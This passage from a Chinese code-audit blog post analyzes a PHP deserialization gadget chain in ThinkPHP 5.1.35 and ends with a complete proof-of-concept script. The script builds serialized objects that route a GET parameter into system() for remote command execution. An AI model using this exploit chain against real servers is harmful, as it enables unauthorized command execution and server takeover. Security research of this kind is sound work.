class="line">      &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>getRelation</code>方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合<code>(!$relation)</code>这里直接<code>return</code>即可</p><p>然后进入<code>getAttr</code>函数当中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    $notFound = <span class="keyword">false</span>;</span><br><span class="line">    $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">    $notFound = <span class="keyword">true</span>;</span><br><span class="line">    $value    = <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里又有一个<code>getData</code>方法</p><p>进去看看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>（<code>$data</code>这里可以自己<code>__construct</code>加上去）</p><p>由于<code>getAttr</code>函数位于<code>Attribute</code>类中，这里需要找到一个类同时继承了<code>Attribute</code>类和<code>Conversion</code>类</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207194020.png" alt=""></p><p>（不得不说PHPStorm是真的好用</p><p>那么现在的目标是满足以下条件的类，要求满足：</p><ul><li><p>不存在visible方法</p></li><li><p>存在<code>__call</code>方法可利用</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> __call ( string $name , <span class="keyword">array</span> $arguments ) : mixed</span><br></pre></td></tr></table></figure><p><code>__call</code>方法仅<code>$arguments</code>数组参数可以被控制，<code>$name</code>是不可控的</p><p>这里全局找一下下<code>__call</code>方法，在<code>__call</code>方法中虽然有点点多…..<br><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110224707.png" alt=""></p><p>经过我瞎乱点，终于点到了一个使用了args参数的<code>__call</code>方法</p><p>位于\think\Request中的<code>__call</code>方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">    array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>$this-&gt;hook</code>可控</p><p>但如果直接插入的话。面临着一个问题，那就是前面的array_unshift(<code>$args</code>, <code>$this</code>);会把$this插入到<code>$args</code>的最开头</p><p>这里比如说要构造，由于array_unshift的作用，导致如下结果（应该是这样吧，有错误表哥请指出）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$hook = [<span class="string">'visible'</span>=&gt;<span class="string">'任意命令执行方法'</span>];</span><br><span class="line">call_user_func_array(<span class="string">"任意命令方法"</span>，[$obj,<span class="string">"方法的参数"</span>]);</span><br></pre></td></tr></table></figure><p>这种情况下需要寻找TP5内置的过滤器进行过滤，使得可以把回调函数中混进来的莫名其妙的东西去除掉</p><p>这里全局搜一下filter函数找到个filterValue函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111132644.png" alt=""></p><p>但这里<code>$value</code>为方法内参数不可控，得寻找使用了filterValue函数的地方</p><p>但这里参数都不可控，继续寻找调用了input函数的点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111133505.png" alt=""></p><p>全局找一下下调用了input函数的点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111133611.png" alt=""></p><p>这里找到个parm函数，但这里参数都不可控，继续寻找调用了parm方法的点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111134138.png" alt=""></p><p>继续找使用了parm函数的点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111134445.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $config = [</span><br><span class="line">  <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">  <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">  <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">  <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">  <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">  <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">  <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">  <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">  <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">  <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">  <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">  <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">  <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="comment">// HTTPS代理标识</span></span><br><span class="line">  <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">  <span class="comment">// IP代理获取标识</span></span><br><span class="line">  <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">  <span class="comment">// URL伪静态后缀</span></span><br><span class="line">  <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">];</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前是否Ajax请求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool $ajax  true 获取原始ajax请求</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">  $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在isAjax函数中，可以看到引用了parm函数，而且此时$this-&gt;config是可控的，那么就意味着parm函数中的name值可控，也就意味着input函数的<code>$name</code>参数是可控的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111135355.png" alt=""></p><p>此时继续往上，也就意味着filterValue函数的$name参数可控</p><p>继续回到parm函数当中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111143915.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111143931.png" alt=""></p><p>通过<code>$_GET</code>来赋值给<code>$this-&gt;param</code>,此时又回到了input函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111144343.png" alt=""></p><p>跟进getData函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111144357.png" alt=""></p><p>这里<code>$data</code>直接等于<code>$data[$val]</code>了</p><p>而这里<code>$filter</code>通过getFilter来获得，进getFilter瞅瞅</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111145146.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111145218.png" alt=""></p><p>这里的<code>$filter</code>来自于<code>$this-&gt;filter</code>，我们需要定义<code>this-&gt;filter</code>为函数名。</p><p>回到input函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>$data</code>为数组，此时使用了<code>array_walk_recursive</code>函数，函数方法如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111150819.png" alt=""></p><p>大致意思是对<code>$data</code>进行filterValue函数过滤，函数的参数为<code>$filter</code></p><p>看一下下<code>filterValue</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">      <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">      $value = call_user_func($filter, $value);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 正则过滤</span></span><br><span class="line">        <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">          <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">          $value = $default;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">        <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">        <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">        $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">          $value = $default;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（我已经有点晕了·····</p><p>这里分析一下filterValue的参数来源：<br><code>$data</code>来自于getData函数</p><p><code>filter</code>来自于getFilter函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line">$filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><p>上面分析可知，在input函数中</p><p><code>$data</code>直接等于<code>$data[$val]</code>了</p><p><code>$filter</code>需要自己定义<code>$this-&gt;filter</code></p><p>继续回到parm函数当中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>而根据上面的分析</p><p>通过<code>$_GET</code>来赋值给<code>$this-&gt;param</code>，<code>$filter</code>还是为input的<code>filter</code></p><p>所以最后可知<code>filterValue</code>的参数值如下：</p><ul><li><p><code>value</code>为<code>$_GET</code>请求的键</p></li><li><p><code>key</code>为<code>$_GET</code>请求的值</p></li><li><p><code>filter</code>为input当中的<code>filter</code></p></li></ul><h2 id="POC分析编写"><a href="#POC分析编写" class="headerlink" title="POC分析编写"></a>POC分析编写</h2><p>首先要在<code>Model</code>类中，对<code>append</code>和<code>data</code>进行赋值</p><p>且要满足<code>append</code>为数组，满足条件，上面已经分析过了，<code>$key</code>要满足不在<code>$relation</code>当中，这里随便起个名字就行，比如<code>xmhgg</code></p><p>然后需要进入<code>getAttr</code>和<code>getData</code>当中，根据上面分析，<code>$relation</code>的值为<code>$this-&gt;data[$name]</code>，这里设置<code>$data</code>的键值为<code>xmhgg</code>即可，<code>$name</code>需要根据后面的<code>__call</code>方法当中的<code>hook</code>情况进行赋值</p><p>所以这一步本质上是为了能够跳转到<code>__call</code>当中，其中<code>append</code>当中的值是为了充当<code>__call</code>的<code>$args</code></p><p><code>$data</code>当中的值是作为对象能够访问他不存在的<code>visible</code>方法从而触发<code>__call</code>，而<code>visible</code>方法在<code>Request</code>类中</p><p>在<code>Request</code>中的<code>__call</code>方法中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里<code>hook</code>的键设置为<code>visible</code>，其中<code>$args</code>为刚才的<code>$data</code>当中的值</p><p>这里又开始<code>filter</code>了，害，我太难了</p><p><code>$filter</code>根据</p><p>这里吧<code>$config</code>照抄过来</p><p><code>$filter</code>直接写进去即可</p><p>而<code>config[&#39;var_ajax&#39;]</code>的值通过置为空，然后通过<code>$_GET</code>传入即可</p><p>而对于<code>hook</code>函数的值，我们使用<code>isAjax</code>，然后依次回到<code>parm</code>函数、<code>input</code>函数等等</p><p>最后回到</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111174116.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111174130.png" alt=""></p><p>中执行了命令</p><p>所以POC思路如上，编写：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"xmhgg"</span>=&gt;[<span class="string">"ls"</span>,<span class="string">""</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"xmhgg"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200111184015.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;ThinkPHP自版本5以后采用composer安装模块，这里附上安装指令&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110213849.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于反序列化需要触发点，官方框架里是没有现成的反序列化触发点，我们这里给他构造一个&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200110221057.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;设置完毕后在TP根目录下启动服务即可&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;php think run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://a2u13.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://a2u13.com/tags/PHP/"/>
    
      <category term="反序列化" scheme="https://a2u13.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ThinkPHP" scheme="https://a2u13.com/tags/ThinkPHP/"/>
    
  </entry>
  
</feed>
